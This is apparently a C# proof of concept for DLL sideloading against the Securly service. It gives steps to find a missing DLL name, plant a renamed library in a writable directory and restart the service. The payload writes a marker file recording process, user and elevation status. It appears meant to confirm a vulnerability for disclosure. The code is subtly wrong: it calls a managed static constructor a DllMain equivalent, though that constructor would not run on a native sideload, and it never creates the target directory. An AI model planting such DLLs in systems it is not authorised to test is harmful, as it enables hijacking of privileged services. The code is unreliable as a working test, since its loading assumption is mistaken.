/*
 * Securly DLL Sideloading Marker PoC
 *
 * Purpose:
 *   Confirms whether Securly's service or agent loads DLLs from a
 *   user-writable directory. If loaded, creates a harmless marker file
 *   "hi.vdf" in C:\ProgramData\securly\ to prove execution occurred.
 *
 *   .vdf is not a format Securly uses, making the file unambiguous
 *   evidence of DLL sideloading rather than a file created by normal
 *   application behavior.
 *
 * What this does NOT do:
 *   - Execute any shellcode
 *   - Escalate privileges intentionally
 *   - Modify registry or system files
 *   - Communicate over the network
 *   - Persist after reboot
 *
 * How to compile:
 *   csc /target:library /out:SecurlyMarker.dll SecurlyMarker.cs
 *   (or build as Class Library in Visual Studio targeting .NET Framework 4.x)
 *
 * How to use:
 *   1. Run Process Monitor on the test machine filtered to the Securly
 *      service process, looking for NAME NOT FOUND DLL loads.
 *   2. Rename this DLL to match whatever DLL name Process Monitor shows
 *      being searched for in the writable directory.
 *   3. Place the renamed DLL in that writable directory.
 *   4. Restart the Securly service or trigger the load path.
 *   5. Check for C:\ProgramData\securly\hi.vdf
 *      - File exists = DLL sideloading confirmed
 *      - File absent = DLL was not loaded from this location
 *
 * This is intended for Windows and is unlikely to work on any other OS/platform.
 * 
 * (C) simplykit 2026
 */

using System;
using System.IO;
using System.Reflection;

namespace SecurlyMarker
{
    public class Marker
    {
        // Path where the marker file will be created
        private const string MarkerPath = @"C:\ProgramData\securly\hi.vdf";

        // DllMain equivalent for .NET - called when the assembly is loaded
        static Marker()
        {
            try
            {
                CreateMarker();
            }
            catch
            {
                // Silently fail - we don't want the host process to crash
                // A crash would obscure whether the DLL was actually loaded
            }
        }

        private static void CreateMarker()
        {
            string directory = Path.GetDirectoryName(MarkerPath);

            // Record which process loaded this DLL and at what privilege level
            string content = string.Join(Environment.NewLine, new[]
            {
                "# Securly DLL Sideloading Marker",
                "# This file confirms that an untrusted DLL was loaded by the Securly process.",
                "# This is a security vulnerability - DLL search order hijacking.",
                "",
                $"timestamp={DateTime.UtcNow:O}",
                $"loaded_by_process={System.Diagnostics.Process.GetCurrentProcess().ProcessName}",
                $"loaded_by_pid={System.Diagnostics.Process.GetCurrentProcess().Id}",
                $"dll_location={Assembly.GetExecutingAssembly().Location}",
                $"current_user={Environment.UserName}",
                $"machine_name={Environment.MachineName}",
                $"is_elevated={IsElevated()}",
                $"clr_version={Environment.Version}",
            });

            File.WriteAllText(MarkerPath, content);
        }

        private static string IsElevated()
        {
            try
            {
                var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                var principal = new System.Security.Principal.WindowsPrincipal(identity);
                bool elevated = principal.IsInRole(
                    System.Security.Principal.WindowsBuiltInRole.Administrator
                );
                return elevated ? "YES - running as administrator or SYSTEM" : "NO - standard user context";
            }
            catch
            {
                return "unknown";
            }
        }
    }
}
